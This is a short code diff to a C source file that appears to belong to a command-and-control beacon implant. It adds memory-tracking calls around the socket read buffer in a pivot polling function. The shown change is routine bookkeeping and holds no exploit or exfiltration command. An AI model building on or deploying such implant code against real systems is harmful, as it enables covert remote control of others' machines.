@@ -1,5 +1,6 @@
 #include <winsock2.h>
 #include "beacon.h"
+#include "track_memory.h"
 #include "commands.h"
 #include "channel.h"
 #include "parse.h"
@@ -598,8 +599,11 @@ int pivot_poll_reader(void (*callback)(char * buffer, int length, int type)) {
 	int read   = 0;
 
 	/* allocate our read buffer plz */
-	if (read_buffer == NULL)
+	if (read_buffer == NULL) {
 		read_buffer = (char *)malloc(SOCKET_READ_MAX);
+		if (read_buffer != NULL)
+			track_memory_add(read_buffer, SOCKET_READ_MAX, TRACK_MEMORY_MALLOC, TRUE, NULL);
+	}
 
 	while (temp != NULL) {
 		/* if the socket is dead, go to the next item */
